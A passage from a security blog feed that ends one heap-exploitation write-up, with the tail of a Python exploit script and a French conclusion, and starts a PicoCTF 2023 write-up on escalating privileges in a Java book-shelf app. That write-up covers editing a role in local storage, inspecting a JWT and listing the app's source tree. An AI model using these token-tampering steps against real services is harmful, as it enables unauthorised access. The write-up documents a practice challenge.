</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, parler()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Pour un premier challenge de <em>heap</em> de ma vie, j&rsquo;ai appris énormément de choses, c&rsquo;était super intéressant !</p>
<p>Si j&rsquo;ai fait des erreurs n&rsquo;hésitez pas à me contacter sur discord (disponible sur la page <strong>About</strong>)</p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 PicoCTF 2023 - web/Java Code Analysis!?!</title>
            <link>/posts/2023/03/picoctf-2023-web/java-code-analysis/</link>
            <pubDate>Thu, 30 Mar 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/03/picoctf-2023-web/java-code-analysis/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Java Code Analysis!?!&lt;/em&gt; was a &lt;em&gt;web exploitation&lt;/em&gt; challenge from &lt;strong&gt;PicoCTF 2023&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;I have done a bunch of &lt;em&gt;JWT&lt;/em&gt; challenges, especially on &lt;a href=&#34;https://root-me.org&#34;&gt;https://root-me.org&lt;/a&gt; and I&amp;rsquo;m starting to like exploiting these tokens. Anyways, it was a fun challenge with some basic code analysis and JWT exploiting.&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BookShelf Pico, my premium online book-reading service. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I believe that my website is super secure. 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I challenge you to prove me wrong by reading the &amp;#39;Flag&amp;#39; book! 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Here are the credentials to get you started:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-   Username: &amp;#34;user&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-   Password: &amp;#34;user&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://artifacts.picoctf.net/c/480/bookshelf-pico.zip&#34;&gt;&lt;code&gt;source_code.zip&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p><em>Java Code Analysis!?!</em> was a <em>web exploitation</em> challenge from <strong>PicoCTF 2023</strong>.</p>
<p>I have done a bunch of <em>JWT</em> challenges, especially on <a href="https://root-me.org">https://root-me.org</a> and I&rsquo;m starting to like exploiting these tokens. Anyways, it was a fun challenge with some basic code analysis and JWT exploiting.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>BookShelf Pico, my premium online book-reading service. 
</span></span><span style="display:flex;"><span>I believe that my website is super secure. 
</span></span><span style="display:flex;"><span>I challenge you to prove me wrong by reading the &#39;Flag&#39; book! 
</span></span><span style="display:flex;"><span>Here are the credentials to get you started:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-   Username: &#34;user&#34;
</span></span><span style="display:flex;"><span>-   Password: &#34;user&#34;
</span></span></code></pre></div><p><a href="https://artifacts.picoctf.net/c/480/bookshelf-pico.zip"><code>source_code.zip</code></a></p>
<h2 id="recon">Recon</h2>
<p>When we go to the website, we see this login form and we can also create an account, but we won&rsquo;t need to because we&rsquo;re given credentials in the challenge description.</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906618-f7e07832-594b-4ec8-a484-bdc170d9062f.png" alt="2023-03-30-180704_1881x426_scrot"></p>
<p>Once we&rsquo;re logged in, we get redirected to the website&rsquo;s main page. There are three books, a <em>free</em> one, a <em>premium</em> one and an <em>admin</em> one which is the flag.</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906658-76f5a884-458d-4079-af6d-04c83c50fd68.png" alt="2023-03-30-180819_1888x1030_scrot"></p>
<p>Alright, let&rsquo;s take a look around the website and its source code to see if we can find any interesting stuff&hellip;</p>
<p>In the <strong>local storage</strong>, we find an <code>auth-token</code> and a <code>token-payload</code> keys:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906671-36740450-8abd-417c-8bfd-e43591495c3a.png" alt="2023-03-30-181052_1667x78_scrot"></p>
<p>The <code>token-payload</code> looks like it specifies our <em>role</em>, which is supposedly the value we should change to become <em>admin</em>, let&rsquo;s try to change it manually and refresh the page:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906726-ff512dad-6763-4368-9bda-e377a220aa1d.png" alt="2023-03-30-181253_251x286_scrot"></p>
<p>At the top right corner of the page, the &ldquo;<em>Free</em>&rdquo; became &ldquo;<em>Admin</em>&rdquo; and we now have access to the <strong>Admin Dashboard</strong>, let&rsquo;s take a look at this:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906770-517f3a75-64fc-41c8-8ff8-52527432ce72.png" alt="2023-03-30-181357_1877x516_scrot"></p>
<p>It seems we can delete the books, but that&rsquo;s not what we want to do, we only need to read the <em>Flag</em> book&hellip; maybe we can now read it since we&rsquo;re an <em>admin</em> ?</p>
<p><img src="https://user-images.githubusercontent.com/77807503/228906785-75bdcb23-09ff-4a2e-856f-dd7de1854c4a.png" alt="2023-03-30-181505_287x82_scrot"></p>
<p>Of course not ! That would have been way too easy&hellip; Time to take a look at this jwt:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4c
</span></span><span style="display:flex;"><span>CI6MTY4MDc5NzI5NCwiaWF0IjoxNjgwMTkyNDk0LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.LsB8gkkevf
</span></span><span style="display:flex;"><span>0hJiLP6HOTdzvakaT_yRXofg3mH_gTJls
</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
<p><img src="https://user-images.githubusercontent.com/77807503/228906810-1feeddc4-2f88-477e-b591-f497f8a2e2ee.png" alt="2023-03-30-181624_1196x680_scrot"></p>
<p>By pasting it into <a href="https://jwt.io">https://jwt.io</a>, we learn a little bit more about what is stored in this token. It seems like the <code>token-payload</code> actually corresponds to the <code>JWT</code>&rsquo;s payload (obviously).</p>
<p>Alright, so we can assume we also need to modify the <code>JWT</code> to modify our role..</p>
<blockquote>
<p>I&rsquo;ve tried the basic exploits such as <em>None</em> alg and cracking the but none of them worked</p></blockquote>
<p>Time to take a look at the source code !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> build<span style="color:#f92672">.</span>gradle
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> gradle
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> wrapper
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">├──</span> gradle<span style="color:#f92672">-</span>wrapper<span style="color:#f92672">.</span>jar
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">└──</span> gradle<span style="color:#f92672">-</span>wrapper<span style="color:#f92672">.</span>properties
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> gradlew
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> gradlew<span style="color:#f92672">.</span>bat
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> README<span style="color:#f92672">.</span>md
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> settings<span style="color:#f92672">.</span>gradle
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">├──</span> src
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> main
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> io
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>       <span style="color:#960050;background-color:#1e0010">└──</span> github
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>           <span style="color:#960050;background-color:#1e0010">└──</span> nandandesai
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>               <span style="color:#960050;background-color:#1e0010">└──</span> pico
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> BookShelfBaseServerApplication<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> configs
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> BookShelfConfig<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserDataPaths<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> controllers
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> BookController<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> GeneralErrorController<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserController<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> dto
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> BookDto<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> PDF<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> Photo<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> requests
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> AddBookRequest<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> AddUserPhotoRequest<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> UpdateUserPasswordRequest<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> UpdateUserRoleRequest<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> UserLoginRequest<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserSignUpRequest<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> responses
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> ErrorResponse<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> Response<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> ResponseType<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> RoleDto<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserDto<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> exceptions
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> CommonExceptionHandler<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> DuplicateEntityException<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> InternalServerException<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> LoginFailedException<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> ResourceNotFoundException<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> ValidationExceptionHandler<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> ValidationException<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> models
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> Book<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> Role<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> User<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> repositories
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> BookRepository<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> RoleRepository<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserRepository<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> security
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> BookPdfAccessCheck<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> JwtService<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> models
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> JwtUserInfo<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> UserAuthority<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserSecurityDetails<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> ReauthenticationFilter<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> SecretGenerator<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> SecurityConfig<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> TokenException<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserSecurityDetailsService<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> services
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">├──</span> BookService<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> UserService<span style="color:#f92672">.</span>java
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">├──</span> utils
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">│</span>                   <span style="color:#960050;background-color:#1e0010">│</span>   <span style="color:#960050;background-color:#1e0010">└──</span> FileOperation<span style="color:#f92672">.</span>java
